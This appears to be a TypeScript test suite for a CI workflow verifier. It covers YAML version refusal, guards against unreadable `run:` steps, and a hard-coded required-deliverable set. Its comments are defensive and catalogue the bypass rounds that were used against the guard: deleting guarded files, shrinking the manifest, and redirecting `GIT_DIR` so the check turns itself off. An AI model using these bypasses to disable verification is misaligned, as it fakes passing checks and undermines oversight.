  /** Any non-1.2 version, not merely the one that was reported. */
  for (const directive of ["%YAML 1.1", "%YAML 1.3"]) {
    it(`refuses ${directive}`, () => {
      const parsed = parseWorkflow(`${directive}\n---\nname: verify\n`);

      assert.equal(parsed.ok, false, `${directive} was accepted`);
    });
  }

  /**
   * NON-VACUITY, and it matters here: a check that refused every directive
   * would pass the cases above while saying nothing about the version.
   */
  it("still accepts an explicit 1.2 directive", () => {
    const parsed = parseWorkflow("%YAML 1.2\n---\nname: verify\n");

    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;
    assert.equal(get(parsed.root, "name"), "verify");
  });

  it("still accepts the shipped workflow, which declares no directive", () => {
    assert.equal(parseWorkflow(SOURCE).ok, true);
  });

  /**
   * AND THE 1.1 SEMANTICS ARE THE REASON, stated as a case so the refusal is
   * tied to what actually differs: under 1.1 these plain scalars resolve to
   * booleans, which is precisely the resolution difference the reader cannot
   * model.
   */
  it("refuses 1.1 even where 1.2 would read the same text safely", () => {
    const under12 = parseWorkflow("name: no\n");
    assert.equal(under12.ok, true, "under 1.2 `no` is the string");
    if (under12.ok) assert.equal(get(under12.root, "name"), "no");

    assert.equal(parseWorkflow("%YAML 1.1\n---\nname: no\n").ok, false);
  });
});

describe("TASK-017 round-13 note: the install and verification guards refuse what they cannot read", () => {
  const A = "a".repeat(40);

  function withRuns(commands: readonly string[]): YamlMap {
    const lines = [
      "name: x", "on:", "  pull_request:", "    branches:", '      - "**"',
      "  push:", "    branches:", '      - "**"', "permissions:", "  contents: read",
      "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:",
      `      - uses: actions/checkout@${A}`, "        with:", '          persist-credentials: "false"',
      `      - uses: actions/setup-node@${A}`, "        with:", '          node-version: "22.5.0"',
      ...commands.map((c) => `      - run: ${c}`),
    ];
    const result = parseWorkflow(lines.join("\n") + "\n");
    assert.equal(result.ok, true, `fixture does not parse: ${result.ok ? "" : result.reason}`);
    if (!result.ok) throw new Error("unreachable");
    return result.root;
  }

  /**
   * `declaredRunCommands` drops a non-string `run:`, so `run: [evil]` beside a
   * valid `npm ci` left both these guards returning ok. Two siblings refused
   * the workflow, so there was no survivor — but "a sibling refuses it" is not
   * "this guard holds", and each guard is asserted on its own here.
   */
  it("checkInstall refuses a run: it cannot read, on its own", () => {
    const verdict = checkInstall(withRuns(["npm ci", "npm test", "[evil]"]));

    assert.equal(verdict.ok, false, "a non-string run left the install guard satisfied");
    assert.match(verdict.ok === false ? verdict.reason : "", /single command/);
  });

  it("checkVerificationCommand refuses a run: it cannot read, on its own", () => {
    const verdict = checkVerificationCommand(withRuns(["npm ci", "npm test", "[evil]"]));

    assert.equal(verdict.ok, false, "a non-string run left the verification guard satisfied");
    assert.match(verdict.ok === false ? verdict.reason : "", /single command/);
  });

  /** NON-VACUITY: both still accept the commands the workflow actually runs. */
  it("both still accept npm ci and npm test", () => {
    const root = withRuns(["npm ci", "npm test"]);

    assert.equal(checkInstall(root).ok, true);
    assert.equal(checkVerificationCommand(root).ok, true);
  });
});

describe("TASK-017 round-14 CRITICAL: the required deliverable set lives in the verifier", () => {
  /**
   * FIVE ROUNDS OF ONE ATTACK. Each fix moved the requirement one step further
   * from the attacker and was defeated by taking one more step:
   *
   *   round 8   rested on the manifest's ENTRIES   -> comment them out
   *   round 12  rested on the ANCHOR file          -> delete the workflow
   *   round 13  rested on `workflowPolicy.ts`      -> delete that too
   *   round 14  rested on the manifest's CONTENTS  -> shrink the manifest
   *
   * Round 13 moved EXISTENCE to HEAD and left CONTENTS in the working tree, so
   * round 14 kept the committed path and replaced its contents with one benign
   * entry. It also redirected `GIT_DIR` at an empty repository, which made the
   * `git ls-tree` query throw and the guard turn itself off.
   *
   * WHY THE REQUIREMENT IS UNCONDITIONAL. The first repair attempted here asked
   * "is this the repository that owes the deliverable?" and checked the set only
   * then — which is precisely the round-4 CRITICAL, keying the gate on the
   * package name so a one-word rename disables it. The existing case
   * "nowhere names this repository" caught it. Every identity signal has that
   * defect, because the working tree is what the attacker edits: a name can be
   * changed, a marker added, a git query made to fail. A condition is a switch,
   * and a switch can be thrown. So there is no condition.
   *
   * WHAT THIS BLOCK IS AND IS NOT. These are shape assertions, and shape
   * assertions are weak evidence — round 8 said so, and round 14 proved it again
   * when a mutation of this area walked through a regex. The REAL evidence is in
   * `tests/verificationHarnessEndToEnd.test.ts`, which strips complete fixtures
   * and runs the actual verifier against them.
   *
   * An earlier version of this comment claimed that end-to-end deletion attack
   * lived in `scripts/mutate.mjs`. It did not: the mutator performs source
   * mutations and contains no filesystem deletion whatsoever. Round 14 found the
   * overclaim, and it is corrected rather than quietly dropped — a comment
   * asserting evidence that does not exist is the same defect as a test that
   * passes for the wrong reason.
   */
  it("derives the required set from a literal, not from the manifest it validates", () => {
    const verifier = readFileSync(join(REPO_ROOT, "scripts/verify.mjs"), "utf8");

    assert.match(
      verifier,
      /const REQUIRED_GUARDS = \[/,
      "the required deliverable set is not a literal in the verifier",
    );
    /**
     * The set must NAME the deliverable. A `REQUIRED_GUARDS` that existed but
     * listed nothing would satisfy the assertion above while requiring nothing
     * at all — the round-8 empty-manifest bypass, relocated.
     */
    for (const required of [
      "src/verification/workflowPolicy.ts",
      "src/verification/workflowDocument.ts",
      "src/verification/workflowDigest.ts",
    ]) {
      assert.ok(
        verifier.includes(required),
        `the required set does not name ${required}, so losing it would go unnoticed`,
      );
    }
  });

  /**
   * NO SWITCH. The round-14 HIGH was a failed git subprocess returning `false`
   * and disabling the guard; the round-4 CRITICAL was a package name doing the
   * same. Neither may gate the requirement.
   */
  it("makes the requirement conditional on nothing the tree can say", () => {
    const verifier = readFileSync(join(REPO_ROOT, "scripts/verify.mjs"), "utf8");

    assert.doesNotMatch(
      verifier,
      /manifestIsCommitted/,
      "the defeated round-13 git predicate is still present",
    );
    /**
     * WHETHER the deliverable is owed asks NO SUBPROCESS. `.git` is read from
     * the filesystem, so the round-14 HIGH has nothing left to attack: there is
     * no query to redirect with `GIT_DIR` and none to break by removing git.
     * A question never asked cannot be answered wrongly.
     */
    assert.match(
      verifier,
      /const looksLikeRepository = existsSync\(join\(REPO_ROOT, "\.git"\)\);/,
      "whether this is a repository is decided by something other than the filesystem",
    );
    /**
     * Anchored to the line start: round 13's survivor was a mutation that
     * PREPENDED `false &&`, which a substring match still satisfied.
     */
    assert.match(
      verifier,
      /\n  if \(shortfalls\.length > 0\) \{/,
      "a shortfall in the required set is not refused",
    );
    assert.match(
      verifier,
      /\nif \(guarded\.length === 0 && existsSync/,
      "an empty manifest is not refused",
    );
  });

  /**
   * THE REQUIREMENT IS LIVE IN THIS REPOSITORY. If this ever fails, the guard is
   * inert here and the deliverable could be deleted with the suite still green.
   */
  it("is satisfied by this tree, so the guard is live rather than inert", () => {
    for (const required of [
      "src/verification/workflowPolicy.ts",
      "src/verification/workflowDocument.ts",
      "src/verification/workflowDigest.ts",
      "tests/workflowPolicy.test.ts",
      "tests/workflowDigest.test.ts",
      ".github/workflows/verify.yml",
      "src/verification/guardedModules.ts",
    ]) {
      assert.equal(
        existsSync(join(REPO_ROOT, required)),
        true,
        `${required} is absent, so the tree does not satisfy its own required set`,
      );
    }
    const declared = new Set(GUARDED_MODULES.map(({ module }) => module));
    for (const required of [
      "src/verification/workflowPolicy.ts",
      "src/verification/workflowDocument.ts",
      "src/verification/workflowDigest.ts",
    ]) {
      assert.ok(declared.has(required), `${required} is not declared in the manifest`);
    }
  });
});
